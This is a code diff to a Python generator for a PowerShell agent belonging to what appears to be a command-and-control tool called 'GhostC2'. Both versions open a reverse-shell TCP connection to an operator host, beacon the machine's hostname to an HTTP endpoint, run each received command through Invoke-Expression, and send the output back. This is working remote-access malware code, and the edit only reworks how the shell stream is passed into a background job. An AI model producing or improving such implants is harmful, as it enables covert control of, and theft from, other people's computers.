@@ -58,43 +58,40 @@ function XOR($data,$key=0x5A){
 """
 def get_http_tasker(host, port=8080):
     return f"""
-Start-Job -ScriptBlock {{
-    $stream = $null
-    try {{
-        $client = New-Object System.Net.Sockets.TCPClient("{host}",1443)
-        $stream = $client.GetStream()
-    }} catch {{}}
+# Establish TCP connection in main scope
+$client = New-Object System.Net.Sockets.TCPClient("{host}",1443)
+$stream = $client.GetStream()
 
+# Pass it into the job via param
+Start-Job -ScriptBlock {{
+    param($stream, $host, $port)
     while ($true) {{
         try {{
             $hostname = $env:COMPUTERNAME
-            $ip = (Invoke-RestMethod -Uri "http://ifconfig.me")
             $payload = "ps_reverse"
 
-            $resp = Invoke-RestMethod -Uri "http://{host}:{port}/beacon" -Method Post -Body @{{hostname=$hostname;ip=$ip;payload=$payload}} | ConvertTo-Json -Depth 3
+            $resp = Invoke-RestMethod -Uri "http://$host:$port/beacon" -Method Post -Body @{{hostname=$hostname;ip='agent';payload=$payload}} | ConvertTo-Json -Depth 3
             $tasks = ($resp | ConvertFrom-Json).tasks
 
             foreach ($cmd in $tasks) {{
                 $out = Invoke-Expression $cmd | Out-String
 
                 # Write to reverse shell
-                if ($stream) {{
-                    try {{
-                        $send = "[GhostC2] Command: $cmd`n$out`n"
-                        $bytes = [System.Text.Encoding]::ASCII.GetBytes($send)
-                        $stream.Write($bytes, 0, $bytes.Length)
-                        $stream.Flush()
-                    }} catch {{}}
-                }}
+                try {{
+                    $send = "[GhostC2] $cmd`n$out`n"
+                    $bytes = [System.Text.Encoding]::ASCII.GetBytes($send)
+                    $stream.Write($bytes, 0, $bytes.Length)
+                    $stream.Flush()
+                }} catch {{}}
 
                 # Send result back to GhostC2
                 $body = @{{hostname=$hostname;command=$cmd;result=$out;payload=$payload}} | ConvertTo-Json -Depth 3
-                Invoke-RestMethod -Uri "http://{host}:{port}/result" -Method Post -Body $body -ContentType "application/json"
+                Invoke-RestMethod -Uri "http://$host:$port/result" -Method Post -Body $body -ContentType "application/json"
             }}
         }} catch {{}}
         Start-Sleep -Seconds 10
     }}
-}} | Out-Null
+}} -ArgumentList $stream, "{host}", {port} | Out-Null
 """
 
 
